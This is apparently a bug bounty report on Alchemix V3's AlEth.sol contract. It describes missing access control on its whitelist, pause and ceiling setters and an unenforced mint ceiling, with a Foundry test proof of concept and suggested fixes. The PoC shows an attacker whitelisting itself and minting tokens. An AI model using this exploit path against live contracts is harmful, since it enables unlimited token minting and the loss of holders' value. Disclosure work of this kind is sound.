
#  Smart Contract Vulnerability Report
**Alchemix V3**:

##  Vulnerability Title 

Unlimited Minting With AccesControlFailure

## 🗂 Report Type

Smart Contract


## 🔗 Target


- https://github.com/alchemix-finance/v3-poc/tree/immunefi_audit/src/external/AlEth.sol


## Asset


AlEth.sol



##  Rating


Severity: Critical

Impact: Critical

Likelihood: Low

Attack Complexity :Low



##  Description
👇🏽
Although I understand that these contract may be out of the official bug bounty scope🐧,
the identified issues demonstrate significant vulnerabilities and security design flaws.
All details, including reproduction steps and tests, are fully documented in the accompanying test files


Unlimited Minting:

The `mint()` function allows any whitelisted address to mint tokens without any limit.
There is no check enforcing the `ceiling` value or any overall supply restriction.
Once an attacker whitelists themselves, they can call `mint()` repeatedly to create infinite tokens.
```solidity
function mint(address _recipient, uint256 _amount) external onlyWhitelisted {
    require(!paused[msg.sender], "AlETH: Alchemist is currently paused.");
    hasMinted[msg.sender] = hasMinted[msg.sender] + _amount;
    _mint(_recipient, _amount);
}
```


AccesControlFailure:

contract `AlEth` exposes several administrative functions `setWhitelist`, `pauseAlchemist`,`setCeiling` that lack any form of access control.
As a result, any external address can call these functions and arbitrarily:

Add themselves (or any other address) to the whitelist.

Unpause or pause any address.

Set arbitrary ceiling values for minting.

This allows an attacker to whitelist themselves, bypass minting restrictions, and mint unlimited tokens



##  Impact

Any external attacker can:

Whitelist their own address.

Set a very high ceiling.

Mint an unlimited number of alETH tokens.


Token holders: Total loss of value.

Economic collapse

External integrations (DEXs, lending protocols): Contamination of reserves.




##  Vulnerability Details


Unlimited Minting:

This function does not use the ceiling variable to check the user's maximum minting amount.

```solidity 

    function mint(address _recipient, uint256 _amount) external onlyWhitelisted {
        require(!paused[msg.sender], "AlETH: Alchemist is currently paused.");
        hasMinted[msg.sender] = hasMinted[msg.sender] + _amount;
        _mint(_recipient, _amount);
    }
    
```


 Access Control Failure

in this function 👇🏽

```solidity 
    function setWhitelist(address _toWhitelist, bool _state) external {
        whiteList[_toWhitelist] = _state;
    }
    function pauseAlchemist(address _toPause, bool _state) external {
        paused[_toPause] = _state;
    }
    function setCeiling(address _toSetCeiling, uint256 _ceiling) external {
        ceiling[_toSetCeiling] = _ceiling;
    }

    
```





##  Proof of Concept (PoC)



```solidity 


// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/AlEth.sol";

// We have two test cases here demonstrating two vulnerabilities
contract TestAdapterReassignment is Test {
    AlEth aleth;
    address badUser = address(0x0002);
    address owner = address(0x0001);
    address user = address(0x0003);

    function setUp() public {
        aleth = new AlEth();

        // Attacker adds themselves to the whitelist to gain minting access
        aleth.setWhitelist(badUser, true);

        // These are set because of missing access control (for the second test)
        aleth.setWhitelist(owner, true);
        aleth.setWhitelist(user, true);
    }

    /// @notice This test demonstrates an access control violation
    function test_AccessControl() public {

        vm.startPrank(badUser);

        // Attacker sets a ceiling for anyone (no access control)
        aleth.setCeiling(user, 1);

        // Ensure  not paused🐧
        aleth.pauseAlchemist(badUser, false);

        // Pause the legitimate user (demonstrating arbitrary pause control)
        aleth.pauseAlchemist(user, true);

        // Minting ~ ...
        aleth.mint(badUser, 20000000000000000);

        // too
        aleth.lowerHasMinted(100000000000000);

        vm.stopPrank();
    }

    /// @notice Test for mint logic that shows there is no actual ceiling enforcement
    function test_MintLogic() public {

        vm.prank(owner);

        // Owner sets a ceiling for the user so the user should not be able to mint more than this
        aleth.setCeiling(user, 999);

        /// @notice However, because the `ceiling` value is never checked in mint(),
        /// the user can mint any arbitrary amount and bypass the ceiling restriction.

        // User mints more than their allowed ceiling
        vm.prank(user);
        aleth.mint(user, 1000);
    }
}


    
```





## How to fix it (Recommended)



Unlimited Minting:


function mint(address _recipient, uint256 _amount) external onlyWhitelisted {
    require(!paused[msg.sender], "AlETH: Alchemist is currently paused.");

    //add ceiling funtion for check user minting amount
    require(hasMinted[msg.sender] + _amount <= ceiling[msg.sender], "AlETH: Minting exceeds ceiling");

    hasMinted[msg.sender] += _amount;
    _mint(_recipient, _amount);
}





AccesControlfailer:

add acces control onlyOwner for theis functions 

```solidity 

function setWhitelist(address _toWhitelist, bool _state) external onlyOwner {
    whiteList[_toWhitelist] = _state;
}

function pauseAlchemist(address _toPause, bool _state) external onlyOwner {
    paused[_toPause] = _state;
}

function setCeiling(address _toSetCeiling, uint256 _ceiling) external onlyOwner {
    ceiling[_toSetCeiling] = _ceiling;
}


```



## 🔗 References

- https://github.com/alchemix-finance/v3-poc/tree/immunefi_audit/src/external/AlEth.sol





